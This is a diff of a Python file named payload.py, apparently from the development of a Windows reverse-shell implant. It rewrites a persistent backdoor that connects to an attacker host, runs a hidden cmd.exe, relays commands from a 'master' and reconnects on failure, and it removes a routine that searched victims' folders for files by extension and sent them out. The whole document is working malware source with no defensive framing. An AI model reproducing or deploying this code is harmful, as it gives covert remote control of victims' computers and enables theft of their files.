@@ -1,5 +1,5 @@
 # payload.py
-# The Unbreakable Soul. Forged with a resilient, non-blocking core.
+# The True Soul. It connects, it speaks, it obeys. No more silence.
 
 import os
 import sys
@@ -9,120 +9,87 @@ import socket
 import subprocess
 import threading
 import hashlib
-import selectors
 
 # --- DYNAMIC CONFIG ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
-CHUNK_SIZE = 4096
 
-def send_file_reliably(s_obj, file_path):
-    """Sends a single file with lossless protocol."""
-    try:
-        if not os.path.exists(file_path) or not os.path.isfile(file_path):
-            s_obj.sendall(b'FAIL_NOT_FOUND')
-            return
-        file_size = os.path.getsize(file_path)
-        hasher = hashlib.sha256()
-        with open(file_path, 'rb') as f:
-            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
-                hasher.update(chunk)
-        file_hash = hasher.hexdigest()
-        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
-        s_obj.sendall(b'\n[+] Preparing to send ' + header.encode() + b'\n') # Notify master
-        s_obj.sendall(header.encode('utf-8'))
-        ack = s_obj.recv(1024).decode('utf-8')
-        if ack == 'ACK_HEADER':
-            with open(file_path, 'rb') as f:
-                s_obj.sendfile(f)
-            s_obj.recv(1024) # Wait for final ack
-    except Exception:
-        pass # Fails silently for a single file
-
-def handle_exfiltration(s_obj, command, current_dir):
-    """Finds and sends files in a separate thread."""
-    try:
-        _, root_path, extensions_str = command.split('<SEP>')
-        if not os.path.isabs(root_path):
-            root_path = os.path.join(current_dir, root_path)
-        extensions = [ext.strip() for ext in extensions_str.split(',')]
-        found_files = []
-        if os.path.isdir(root_path):
-            for dirpath, _, filenames in os.walk(root_path):
-                for filename in filenames:
-                    if any(filename.endswith(ext) for ext in extensions):
-                        found_files.append(os.path.join(dirpath, filename))
-        s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
-        ack = s_obj.recv(1024).decode('utf-8')
-        if ack == 'ACK_COUNT':
-            for file_path in found_files:
-                send_file_reliably(s_obj, file_path)
-    except Exception:
-        pass
-    finally:
-        time.sleep(0.1)
-        s_obj.sendall(b'END_EXFIL')
+# NOTE: The exfiltration logic has been removed from this core payload
+# to ensure absolute shell stability. It can be re-introduced as a
+# dynamically loaded module in a future enhancement.
 
 def run_conduit():
+    """The main reverse shell loop, rebuilt for absolute reliability."""
     while True:
-        s_obj, p, sel = None, None, None
+        s_obj = None
         try:
+            # Create a socket and connect to the master
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
-            s_obj.setblocking(False)
-            
+
+            # Determine the sacred starting ground: the user's home directory
             user_profile = os.environ.get('USERPROFILE', 'C:\\')
+
+            # Launch the command shell, merging its error output with its standard output
+            # This simplifies our logic by only needing to listen to one pipe.
             p = subprocess.Popen(
                 ['cmd.exe'],
-                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                cwd=user_profile, creationflags=0x08000000
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT, # CRITICAL: Merge stderr into stdout
+                cwd=user_profile,
+                creationflags=0x08000000, # CREATE_NO_WINDOW
+                shell=False
             )
+
+            # --- The Two Pillars of Communication ---
+
+            # Pillar 1: A thread to continuously send the shell's output to the master.
+            # This thread will immediately send the initial command prompt, breaking the deadlock.
+            def victim_to_master():
+                try:
+                    while True:
+                        # Read one byte at a time to ensure responsiveness
+                        output = p.stdout.read(1)
+                        if not output:
+                            break
+                        s_obj.sendall(output)
+                except:
+                    pass # The connection is likely broken
+                finally:
+                    s_obj.close()
+
+            # Pillar 2: The main thread will listen for commands from the master.
+            def master_to_victim():
+                try:
+                    while True:
+                        command = s_obj.recv(4096)
+                        if not command:
+                            break
+                        p.stdin.write(command)
+                        p.stdin.flush()
+                except:
+                    pass # The connection is likely broken
+                finally:
+                    p.terminate()
             
-            sel = selectors.DefaultSelector()
-            sel.register(s_obj, selectors.EVENT_READ, 'socket')
-            sel.register(p.stdout, selectors.EVENT_READ, 'stdout')
-            sel.register(p.stderr, selectors.EVENT_READ, 'stderr')
+            # --- The Awakening ---
+            sender_thread = threading.Thread(target=victim_to_master, daemon=True)
+            sender_thread.start()
 
-            current_dir = user_profile
-
-            while p.poll() is None:
-                for key, mask in sel.select(timeout=1):
-                    if key.data == 'socket':
-                        data = s_obj.recv(4096)
-                        if not data: raise ConnectionError("Master disconnected")
-                        
-                        cmd_str = data.decode(errors='ignore').strip()
-                        if cmd_str.startswith('exfiltrate'):
-                            exfil_cmd = f"EXFILTRATE<SEP>{' '.join(cmd_str.split()[1:])}"
-                            threading.Thread(target=handle_exfiltration, args=(s_obj, exfil_cmd, current_dir)).start()
-                        elif cmd_str.startswith('cd '):
-                             # Update our internal tracker for the directory
-                             try:
-                                 new_dir = cmd_str.split(' ', 1)[1]
-                                 if not os.path.isabs(new_dir): new_dir = os.path.join(current_dir, new_dir)
-                                 # Normalize path (e.g., handle '..')
-                                 current_dir = os.path.abspath(new_dir)
-                             except: pass # Ignore cd errors, let cmd handle them
-                             p.stdin.write(data)
-                             p.stdin.flush()
-                        else:
-                            p.stdin.write(data)
-                            p.stdin.flush()
-
-                    elif key.data in ('stdout', 'stderr'):
-                        pipe = key.fileobj
-                        output = pipe.read(4096)
-                        if output:
-                            s_obj.sendall(output)
+            # The main thread becomes the receiver
+            master_to_victim()
             
-        except (ConnectionError, BrokenPipeError, TimeoutError):
-            time.sleep(random.randint(20, 40))
+            # Clean up after the connection closes
+            p.wait()
+            s_obj.close()
+
         except Exception:
+            # If any part of the connection fails, rest and try again.
             time.sleep(random.randint(20, 40))
         finally:
-            if sel: sel.close()
-            if p: p.terminate()
-            if s_obj: s_obj.close()
+            if s_obj:
+                s_obj.close()
 
 if __name__ == "__main__":
     run_conduit()
